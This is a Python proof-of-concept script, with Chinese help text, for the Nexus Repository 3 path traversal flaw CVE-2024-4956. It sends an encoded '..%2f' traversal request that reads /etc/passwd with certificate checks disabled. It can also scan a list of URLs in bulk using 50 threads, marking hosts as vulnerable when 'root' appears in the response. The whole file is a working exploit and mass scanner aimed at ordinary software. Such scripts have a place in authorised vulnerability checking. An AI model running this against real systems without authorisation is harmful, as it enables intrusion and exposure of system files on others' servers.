#导包
import requests
import re
import sys
import argparse
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings()

def banner():
    ico = """
.------..------..------..------..------.
|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
| :/\: || (\/) || :/\: || :/\: || (\/) |
| (__) || :\/: || :\/: || (__) || :\/: |
| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
`------'`------'`------'`------'`------'

 
    """
    print(ico)

def main():
    banner()
    parser = argparse.ArgumentParser(description=' Nexus Repository 3 路径遍历漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='单个URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='批量URL文件')
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    try:
        
        attack_url = target.rstrip('/') + "/.%2f/..%2f/..%2f/..%2f/..%2f/etc/passwd"
  
        
        response = requests.get(attack_url, verify=False, timeout=10)
  
       
        if response.status_code == 200 and 'root' in response.text:
            print(f"URL [{target}] Nexus Repository 3 路径遍历漏洞(CVE-2024-4956)。")
        else:
            print(f"URL [{target}] 未发现漏洞。")
    except :
        print(f"URL [{target}] 请求失败")

    
if __name__ == '__main__':
    main()